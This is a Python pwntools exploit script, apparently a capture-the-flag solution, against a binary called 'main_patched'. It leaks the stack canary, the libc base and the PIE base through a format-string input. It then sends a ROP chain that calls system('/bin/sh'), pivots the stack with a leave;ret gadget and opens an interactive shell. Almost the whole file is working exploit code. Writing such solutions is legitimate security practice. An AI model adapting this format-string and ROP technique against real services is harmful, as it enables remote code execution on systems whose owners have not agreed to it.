#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x12E1
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.sendlineafter(b":", b"%11$p.%13$p.%17$p")
    io.recvuntil(b"!\n")
    leaks = io.recvline().split(b".")
    canary = int(leaks[0], 16)
    libc.address = int(leaks[1], 16) - 0x2a1ca
    exe.address = int(leaks[2], 16) - exe.sym["main"]
    info("canary: %#x", canary)
    info("libc base: %#x", libc.address)
    info("pie base: %#x", exe.address)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rbp = rop.find_gadget(["pop rbp", "ret"])[0]
    gadget = libc.address + 0x2a873 # pop rdi ; pop rbp ; ret
    sh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]

    payload = flat(
        [
            0x0,
            pop_rdi + 1,
            gadget,
            sh,
            0x0,
            pop_rdi+1,
            system
        ]
    )

    offset = 40
    leave_ret = exe.address + 0x1360 # leave; ret;
    pivot = flat({
        offset: [
            canary,
            exe.sym["gyul_slice"],
            leave_ret
        ]
    })

    io.sendlineafter(b":", payload)

    io.sendline(pivot)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

